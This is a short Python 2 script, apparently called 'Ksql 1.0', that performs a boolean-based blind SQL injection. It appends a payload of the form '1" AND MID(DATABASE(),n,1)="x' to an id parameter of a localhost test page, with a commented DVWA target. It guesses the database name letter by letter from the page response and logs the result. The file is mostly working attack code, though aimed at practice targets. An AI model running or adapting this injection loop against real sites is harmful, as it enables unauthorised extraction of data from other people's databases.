#!/usr/bin/env python
# -*- coding:utf-8 -*-

"""
	author:		kaysen - http://www.xujiantao.com
	version:	Ksql 1.0
"""

import sys, os, inspect, string, time, urllib, re
reload(sys)

def modulePath():
    """
    This will get us the program's directory, even if we are frozen
    using py2exe
    """

    try:
        _ = sys.executable if weAreFrozen() else __file__
    except NameError:
        _ = inspect.getsourcefile(modulePath)

    return os.path.dirname(os.path.realpath(_))

	
	
SQLMAP_ROOT_PATH = modulePath()
KSQL_XML_PATH = os.path.join(SQLMAP_ROOT_PATH, "xml")
QUERIES_XML = os.path.join(KSQL_XML_PATH, "queries.xml")

ITOA64 = "abcdefghijklmnopqrstuvwxyz"

#url = "http://localhost/dvwa/vulnerabilities/sqli/?id=[[[ID]]]&Submit=Submit"
url = 'http://localhost/test/test.php?id=[[[ID]]]'

for num in range(1, 5):

	for word in ITOA64:
	
		tmpUrl = url.replace('[[[ID]]]', '1" AND MID(DATABASE(),' + str(num) + ',1)="' + word)
		
		print tmpUrl
		
		html = urllib.urlopen(tmpUrl).read()
		
		reg = r'<div>(.*)</div>'
		res = re.findall(re.compile(reg), html)
		
		print res
		
		if len(res):
			file_object = open('database.log', 'a')
			file_object.write(word)
			file_object.close()
			print word
			break;

		time.sleep(0.1)
		

file_object = open('database.log')
try:
     all_the_text = file_object.read()
finally:
     file_object.close()

print 'database: ',all_the_text
 